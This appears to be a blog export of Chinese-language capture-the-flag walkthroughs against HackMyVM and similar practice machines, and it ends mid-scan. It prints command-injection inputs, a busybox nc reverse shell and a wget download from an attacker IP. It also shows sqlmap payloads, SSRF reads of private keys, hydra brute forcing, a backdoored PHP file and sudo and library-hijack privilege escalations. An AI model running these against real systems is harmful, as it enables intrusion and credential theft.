01:26 EDTNmap scan report for 192.168.31.158Host is up (0.00070s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:06:63:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds 80端口先注册一个账号，是一个留言板，输入!mpstat可以查看cup的状态，但是输入其他命令不行，猜测只能运行mpstat命令用分号拼接一下命令发现可以执行成功 12!mpstat;idServer: Linux 5.10.0-19-amd64 (MSG) 04/24/25 _x86_64_ (1 CPU) 05:30:02 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 05:30:02 all 1.84 0.01 0.57 0.13 0.00 0.27 0.00 0.00 0.00 97.19 uid=33(www-data) gid=33(www-data) groups=33(www-data) 反弹一个shell 提权sudo -l 1234567www-data@MSG:~$ sudo -lMatching Defaults entries for www-data on MSG: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on MSG: (messagemaster) NOPASSWD: /bin/pidstat pidstat有一个-e参数可以监控执行的命令 1sudo -u messagemaster /bin/pidstat -e bash 执行bash会自动退出，那就写一个公钥进去，home目录下没有.ssh先创建一个.ssh文件夹，然后cp进去一个authorized_keys ssh登录 提权root123456messagemaster@MSG:~$ sudo -lMatching Defaults entries for messagemaster on MSG: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser messagemaster may run the following commands on MSG: (ALL) NOPASSWD: /bin/md5sum 可以执行md5sum，在/var/www/文件夹下还有一个ROOTPASS,可以将root的密码进行md5加密 1234messagemaster@MSG:/var/www$ ls -lltotal 8drwxrwxr-- 5 www-data www-data 4096 Nov 18 2022 html-rw-r----- 1 root root 12 Nov 21 2022 ROOTPASS ROOTPASS的字节是12，说明ROOT的密码是11位的因为最后还有一个换行符，可以先将rockyou.txt里11位的密码先取出来 1grep -E &quot;^.&#123;11&#125;$&quot; /usr/share/wordlists/rockyou.txt &gt;pass.txt 然后对每行进行md5加密 12┌──(root㉿kali)-[~/Desktop/tmp]└─# for i in $(cat pass.txt);do echo $i|md5sum&gt;&gt;md5.txt ;done （有点慢） 再用paste将rockyou.txt和这个合并 1paste -d &#x27;:&#x27; md5.txt /usr/share/wordlists/rockyou.txt &gt;pass.txt 最后grep一下 1grep &quot;85c73111b30f9ede8504bb4a4b682f48&quot; pass.txt 可以得到root的密码是Message5687","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Vinylizer","slug":"HackmyVM-Vinylizer","date":"2025-04-23T09:59:33.000Z","updated":"2025-04-29T03:23:21.994Z","comments":true,"path":"2025/04/23/HackmyVM-Vinylizer/","permalink":"https://lvzhouhang.xyz/2025/04/23/HackmyVM-Vinylizer/","excerpt":"","text":"信息搜集arp-scan -l 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8d:42:52 PCS Systemtechnik GmbH192.168.31.156 08:00:27:6d:ec:17 PCS Systemtechnik GmbH 192.168.31.156 就是靶机地址 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.156 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 06:00 EDTNmap scan report for 192.168.31.156Host is up (0.0025s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:6D:EC:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds 80端口扫描目录只有一个登录的login.php不是弱口令，尝试sql注入 123456789101112131415161718192021222324252627282930313233343536373839404142434445┌──(root㉿kali)-[~/Desktop/tmp]└─# sqlmap -u &quot;http://192.168.31.156/login.php&quot; --forms ___ __H__ ___ ___[&quot;]_____ ___ ___ &#123;1.8.11#stable&#125;|_ -| . [(] | .&#x27;| . ||___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 06:04:37 /2025-04-23/[06:04:37] [INFO] testing connection to the target URLyou have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=0om6k37fejc...nqdkc3ihnt&#x27;). Do you want to use those [Y/n][06:04:38] [INFO] searching for forms[1/1] Form:POST http://192.168.31.156/login.phpPOST data: username=&amp;password=&amp;login=do you want to test this form? [Y/n/q]&gt;Edit POST data [default: username=&amp;password=&amp;login=] (Warning: blank fields detected):do you want to fill blank fields with random values? [Y/n][06:04:38] [INFO] resuming back-end DBMS &#x27;mysql&#x27;[06:04:38] [INFO] using &#x27;/root/.local/share/sqlmap/output/results-04232025_0604am.csv&#x27; as the CSV results file in multiple targets modesqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=GcYl&#x27; AND (SELECT 7194 FROM (SELECT(SLEEP(5)))aupQ) AND &#x27;jWGR&#x27;=&#x27;jWGR&amp;password=yoAl&amp;login=bpLA---do you want to exploit this SQL injection? [Y/n][06:04:39] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 22.04 (jammy)web application technology: Apache 2.4.52back-end DBMS: MySQL &gt;= 5.0.12[06:04:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/root/.local/share/sqlmap/output/results-04232025_0604am.csv&#x27;[*] ending @ 06:04:39 /2025-04-23/ 存在时间盲注，可以注入出来用户和密码 12345678Table: users[2 entries]+----+----------------------------------+-----------+----------------+| id | password | username | login_attempts |+----+----------------------------------+-----------+----------------+| 1 | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0 || 2 | password123 | lana | 0 |+----+----------------------------------+-----------+----------------+ shopadmin的密码解密 19432522ed1a8fca612b11c3980a031f6:addicted2vinyl 然后ssh登录 提权sudo -l查看 1234567shopadmin@vinylizer:/usr/lib/python3$ sudo -lMatching Defaults entries for shopadmin on vinylizer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser shopadmin may run the following commands on vinylizer: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124shopadmin@vinylizer:/usr/lib/python3$ cat /opt/vinylizer.py# @Name: Vinylizer# @Author: MrMidnight# @Version: 1.8import jsonimport randomdef load_albums(filename): try: with open(filename, &#x27;r&#x27;) as file: content = file.read() if not content: return [] albums = json.loads(content) except FileNotFoundError: albums = [] except json.JSONDecodeError: print(f&quot;Error decoding JSON_Config: &#123;filename&#125;.&quot;) albums = [] return albumsdef save_albums(filename, albums): with open(filename, &#x27;w&#x27;) as file: json.dump(albums, file, indent=None)def print_albums(albums): if not albums: print(&quot;No albums available.&quot;) else: print(&quot;Available Albums:&quot;) for album in albums: print(f&quot;- &#123;album[&#x27;name&#x27;]&#125;, Sides: &#123;&#x27;, &#x27;.join(album[&#x27;sides&#x27;])&#125;&quot;)def randomize_sides(album): sides = list(album[&#x27;sides&#x27;]) random.shuffle(sides) return &#123;&quot;name&quot;: album[&#x27;name&#x27;], &quot;sides&quot;: sides&#125;def randomize_vinyl(albums): if not albums: print(&quot;No albums available. Add one with &#x27;A&#x27;.&quot;) return None, None random_album = random.choice(albums) random_side = random.choice(random_album[&#x27;sides&#x27;]) return random_album[&#x27;name&#x27;], random_sidedef add_vinyl(albums, filename, name, num_sides): # Generate sides from A to the specified number sides = [chr(ord(&#x27;A&#x27;) + i) for i in range(num_sides)] # Add new vinyl new_album = &#123;&quot;name&quot;: name, &quot;sides&quot;: sides&#125; albums.append(new_album) save_albums(filename, albums) print(f&quot;Album &#x27;&#123;name&#125;&#x27; with &#123;num_sides&#125; sides added successfully.\\n&quot;)def delete_vinyl(albums, filename, name): for album in albums: if album[&#x27;name&#x27;] == name: albums.remove(album) save_albums(filename, albums) print(f&quot;Album &#x27;&#123;name&#125;&#x27; deleted successfully!\\n&quot;) return print(f&quot;Album &#x27;&#123;name&#125;&#x27; not found.&quot;)def list_all(albums): print_albums(albums)if __name__ == &quot;__main__&quot;: # Banner. Dont touch! print(&quot;o &#x27;O o\\nO o o O o\\no O o\\no o O\\nO O&#x27; O &#x27;OoOo. O o o O ooOO .oOo. `OoOo.\\n`o o o o O o O O o o OooO&#x27; o\\n `o O O O o O o o O O O O\\n `o&#x27; o&#x27; o O `OoOO Oo o&#x27; OooO `OoO&#x27; o\\nBy: MrMidnight o\\n OoO&#x27; \\n&quot;) config_file = &quot;config.json&quot; albums_config = load_albums(config_file) while True: choice = input(&quot;Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : &quot;).upper() if choice == &quot;R&quot;: random_album, random_side = randomize_vinyl(albums_config) if random_album is not None and random_side is not None: print(f&quot;Randomly selected album: &#123;random_album&#125;, Random side: &#123;random_side&#125;\\n&quot;) elif choice == &quot;A&quot;: name = input(&quot;\\nEnter the name of the new album: &quot;) while True: try: num_sides = int(input(&quot;Enter the number of sides for the new album: &quot;)) break # Break the loop if the input is a integer except ValueError: print(&quot;\\nInvalid input. Please enter a valid integer for the number of sides.&quot;) add_vinyl(albums_config, config_file, name, num_sides) elif choice == &quot;D&quot;: name = input(&quot;\\nEnter the name of the album to delete: &quot;) delete_vinyl(albums_config, config_file, name) elif choice == &quot;L&quot;: list_all(albums_config) print(&quot;&quot;) elif choice == &quot;Q&quot;: print(&quot;\\nQuitting Vinylizer.&quot;) break else: print(&quot;Invalid Input!&quot;) 这个python文件没什么可以利用的，查找是否存在库劫持 12find / -writable 2&gt;/dev/null/usr/lib/python3.10/random.py #可写 添加 12import osos.system(&quot;bash -p&quot;) 然后sudo运行","categories":[{"name":"HackMyVMxxs","slug":"HackMyVMxxs","permalink":"https://lvzhouhang.xyz/categories/HackMyVMxxs/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"群友机-Byxs20","slug":"群友靶机-Byxs20","date":"2025-04-20T10:00:19.000Z","updated":"2025-04-30T09:47:56.886Z","comments":true,"path":"2025/04/20/群友靶机-Byxs20/","permalink":"https://lvzhouhang.xyz/2025/04/20/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Byxs20/","excerpt":"","text":"信息搜集arp-scan -l 扫描靶机ip 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:3d:c2:d3 PCS Systemtechnik GmbH192.168.31.149 08:00:27:9e:3d:15 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.406 seconds (106.40 hosts/sec). 3 responded 然后nmap扫描一下开放端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.149Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 06:02 EDTNmap scan report for 192.168.31.149Host is up (0.0018s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:9E:3D:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds 80端口gobuster扫描一下目录 1234567891011121314151617181920212223┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;192.168.31.149&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.149[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt,jpg[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 279]/templates (Status: 301) [Size: 320] [--&gt; http://192.168.31.149/templates/]/template.php (Status: 200) [Size: 258]/conf (Status: 301) [Size: 315] [--&gt; http://192.168.31.149/conf/]/ping.php (Status: 200) [Size: 11] /template.php有一个虚假的文件包含（后面拿到shell之后查看文件可以知道）,ping.php可以执行ping命令，fuzz一下参数 12345678910111213┌──(root㉿kali)-[~/Desktop/tmp]└─# arjun -u &quot;http://192.168.31.149/ping.php&quot; _ /_| _ &#x27; ( |/ /(//) v2.2.7 _/[*] Scanning 0/1: http://192.168.31.149/ping.php[*] Probing the target for stability[*] Analysing HTTP response for anomalies[*] Logicforcing the URL endpoint[✓] parameter detected: debug, based on: http headers[+] Parameters found: debug 找到一个debug参数（其实一开始是想fuzz出了拼接ip的参数的，误打误撞），ip的参数就是ip 1http://192.168.31.149/ping.php?debug&amp;ip=;ls 可以拼接执行命令 123456789101112131415161718192021222324252627282930313233343536#ping.php&lt;?php// diag.php - 表面严格校验，实际暗藏调试后门$ip = $_GET[&#x27;ip&#x27;] ?? &#x27;&#x27;;// 暗桩触发条件：只要携带debug参数if(isset($_GET[&#x27;debug&#x27;]))&#123; // 关闭错误提示避免暴露路径 error_reporting(0); // 输出详细系统信息（伪装成调试模式） echo &quot;&lt;pre&gt;&quot;; echo &quot;[*] Debug Mode Activated\\n&quot;; echo &quot;[+] Raw Command: ping -c 3 &quot; . $ip . &quot;\\n&quot;; // 直接拼接命令执行（无任何过滤） system(&quot;ping -c 3 &quot; . $ip); // 泄漏敏感信息 echo &quot;\\n\\n=== System Info ===\\n&quot;; echo &quot;PHP User: &quot; . shell_exec(&#x27;whoami&#x27;); echo &quot;PHP Version: &quot; . phpversion() . &quot;\\n&quot;; echo &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . &quot;\\n&quot;; echo &quot;&lt;/pre&gt;&quot;; exit;&#125;// 主功能：严格IPv4正则验证（无懈可击）if (!preg_match(&#x27;/^(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)$/&#x27;, $ip)) &#123; die(&quot;Invalid IP!&quot;);&#125;// 安全执行命令（无注入可能）$cmd = [&#x27;ping&#x27;, &#x27;-c&#x27;, &#x27;3&#x27;, $ip];system(escapeshellcmd(implode(&#x27; &#x27;, $cmd)));?&gt; 然后用busybox反弹shell 1;busybox%20nc%20192.168.31.129%204444%20-e%20/bin/bash 拿到shell之后，查看sudo -l 12345678www-data@Byxs20:/tmp$ sudo -lMatching Defaults entries for www-data on Byxs20: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on Byxs20: (ALL : ALL) NOPASSWD: /usr/sbin/reboot 可以执行reboot 上传一个pspy监控一下进程 1www-data@Byxs20:/tmp$ busybox wget 192.168.31.129/pspy64 可以看到root用户将/var/www/html/conf/apache2.conf.bak 复制到了/etc/apache2/apache2.conf 12025/04/20 06:11:01 CMD: UID=0 PID=749 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf apache2.conf.bak文件是我们可控的，后面经过群主提醒我才幡然醒悟，可以做一个软连接啊，/etc/apache2/apache2.conf我们是可读的 123456www-data@Byxs20:/var/www/html/conf$ ln -sf /home/welcome/user.txt apache2.conf.bakwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.confflag&#123;user-05659dca555d4ddbc396b319645f3d2a&#125;www-data@Byxs20:/var/www/html/conf$ ln -sf /root/root.txt apache2.conf.bakwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.confflag&#123;root-f9ef88715e3bbec612f9f88d64ae3a99&#125; 另一个思路就是修改apache2.conf.bak，将web服务以welcome的权限运行，将apacke2.conf.bak里面的User和Group修改一下 12User welcomeGroup welcome 然后上传再重启靶机，然后再次反弹shell会发现用户变成welcome了（这里不能修改成root，是因为apache2默认不允许root启动，如果要root启动，需要添加“-DBIG_SECURITY_HOLE”到CFLAGS环境变量中重新编译） 12iduid=1000(welcome) gid=1000(welcome) groups=1000(welcome) 查看sudo -l 123456789welcome@Byxs20:/home/welcome$ sudo -lsudo -lMatching Defaults entries for welcome on Byxs20: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser welcome may run the following commands on Byxs20: (ALL : ALL) NOPASSWD: /usr/sbin/reboot (ALL : ALL) NOPASSWD: /home/welcome/test/test 就是王炸方案，将test目录换一个名再新创建一个test/test 1234567891011welcome@Byxs20:/home/welcome$ mv test 1mv test 1welcome@Byxs20:/home/welcome$ mkdir testmkdir testwelcome@Byxs20:/home/welcome$ echo &#x27;bash -p&#x27;&gt;test/testecho &#x27;bash -p&#x27;&gt;test/testwelcome@Byxs20:/home/welcome$ chmod +x test/testchmod +x test/testwelcome@Byxs20:/home/welcome$ sudo /home/welcome/test/testsudo /home/welcome/test/testroot@Byxs20:/home/welcome#","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"群友机-Anjy","slug":"群友靶机-Anjy","date":"2025-04-19T08:23:50.000Z","updated":"2025-04-30T09:48:01.895Z","comments":true,"path":"2025/04/19/群友靶机-Anjy/","permalink":"https://lvzhouhang.xyz/2025/04/19/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Anjy/","excerpt":"","text":"信息搜集arp-scan -l扫描靶机地址 123456789┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:da:a9:b6 PCS Systemtechnik GmbH192.168.31.147 08:00:27:e8:2b:5e PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernel 192.168.31.147就是靶机ip，然后nmap扫描端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.147Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 04:25 EDTNmap scan report for 192.168.31.147Host is up (0.0014s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:E8:2B:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds 80端口80端口是一个web页面存在ssrf漏洞，POST传参url=file:///etc/passwd，文件内容会进行base64加密 可以读取到welcome这个用户，home目录下不存在id_rsa,读取/etc/ssh/sshd_config 123#HostKey /etc/ssh/ssh_host_rsa_key#HostKey /etc/ssh/ssh_host_ecdsa_key#HostKey /etc/ssh/ssh_host_ed25519_key 然后挨个试试id_rsa,id_ecdsa,id_ed25519,可以发现存在id_ed25519 1url=file:///home/welcome/.ssh/id_ed25519 拿到私钥了就可以ssh登录了 提权123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# ssh welcome@192.168.31.147 -i idLinux Anjv 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Apr 19 04:31:17 2025 from 192.168.31.129welcome@Anjv:~$ sudo -l可以发现elinks可以以root用户执行，可以直接读取root.txt，也可以任意文件读写，最简单的是再elinks终端按下esc-&gt;file-&gt;OS SHELL 就可以获取到root的shell了","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-find","slug":"HackmyVM-find","date":"2025-04-19T03:22:30.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/19/HackmyVM-find/","permalink":"https://lvzhouhang.xyz/2025/04/19/HackmyVM-find/","excerpt":"","text":"信息搜集arp-scan -l 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:dd:48:d1 PCS Systemtechnik GmbH192.168.31.145 08:00:27:19:2f:ed PCS Systemtechnik GmbH 192.168.31.145是靶机ip，扫描一下端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.145Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 23:23 EDTNmap scan report for 192.168.31.145Host is up (0.0022s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:19:2F:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds 扫描目录 12345678910111213141516171819202122┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.145/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.145/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/cat.jpg (Status: 200) [Size: 35137]/manual (Status: 301) [Size: 317] [--&gt; http://192.168.31.145/manual/]/robots.txt (Status: 200) [Size: 13]/server-status (Status: 403) [Size: 279] user.txtrobots.txt是让你找到user,把cat.jpg下载下来 123456┌──(root㉿kali)-[~/Desktop/tmp]└─# strings cat.jpg...&gt;C&lt;;_&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\\Uy&lt;XWVOsrRKPONGk.-,+*)(&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDZY^W\\[ZYXWPOsSRQPON0Fj-IHAeR 最后一串字符串是Malbolge语言，跑一下得到missyred，然后hydra爆破密码 123456789┌──(root㉿kali)-[~/Desktop/tmp]└─# hydra -l missyred -P /usr/share/wordlists/rockyou.txt 192.168.31.145 sshHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-18 23:30:36[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://192.168.31.145:22/[22][ssh] host: 192.168.31.145 login: missyred password: iloveyou ssh登录,sudo -l 1234567missyred@find:~$ sudo -l[sudo] password for missyred:Matching Defaults entries for missyred on find: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser missyred may run the following commands on find: (kings) /usr/bin/perl perl提权到kings 1missyred@find:~$ sudo -u kings perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27; root.txt123456kings@find:~$ sudo -lMatching Defaults entries for kings on find: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser kings may run the following commands on find: (ALL) NOPASSWD: /opt/boom/boom.sh /opt/boom/boom.sh是不存在的，我们可以自己创建，随便执行sh命令 12#boom.shbash -p sudo /opt/boom/boom.sh 提权到root.txt","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-hotel","slug":"HackmyVM-hotel","date":"2025-04-19T02:56:13.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/19/HackmyVM-hotel/","permalink":"https://lvzhouhang.xyz/2025/04/19/HackmyVM-hotel/","excerpt":"","text":"信息搜集arp-scan -l 1234567┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:f8:3e:94 PCS Systemtechnik GmbH192.168.31.144 08:00:27:5c:e1:4f PCS Systemtechnik GmbH 192.168.31.144就是靶机ip，扫描端口 123PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6480/tcp open http syn-ack ttl 64 开启了22和80端口 user.txt80端口是一个hoteldruid，存在ndayhttps://github.com/kaal18/CVE-2022-22909# 反弹一个shell出来，/var/www/html目录下有一个ttylog很可疑，用ttyplay可以重现当时录制的tty 得到person的密码为 1Endur4nc3. ssh登录，拿到user.txt root.txtsudo -l 123456person@hotel:~$ sudo -lMatching Defaults entries for person on hotel: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser person may run the following commands on hotel: (root) NOPASSWD: /usr/bin/wkhtmltopdf sudo /usr/bin/wkhtmltopdf file:///root/root.txt 1.pdf可以拿到root.txt","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Initial","slug":"春秋云镜-Initial","date":"2025-04-18T12:00:10.000Z","updated":"2025-04-19T13:28:02.245Z","comments":true,"path":"2025/04/18/春秋云镜-Initial/","permalink":"https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/","excerpt":"","text":"FLAG1首先进行信息搜集 123456789101112131415161718192021222324252627282930┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.99.232.66┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-18 08:00:46] [INFO] 暴力破解线程数: 1[2025-04-18 08:00:46] [INFO] 开始信息扫描[2025-04-18 08:00:46] [INFO] 最终有效主机数量: 1[2025-04-18 08:00:46] [INFO] 开始主机扫描[2025-04-18 08:00:46] [INFO] 有效端口数量: 233[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:22[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:80[2025-04-18 08:00:46] [SUCCESS] 服务识别 39.99.232.66:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 08:00:51] [SUCCESS] 服务识别 39.99.232.66:80 =&gt; [http][2025-04-18 08:00:55] [INFO] 存活端口数量: 2[2025-04-18 08:00:55] [INFO] 开始漏洞扫描[2025-04-18 08:00:55] [INFO] 加载的插件: ssh, webpoc, 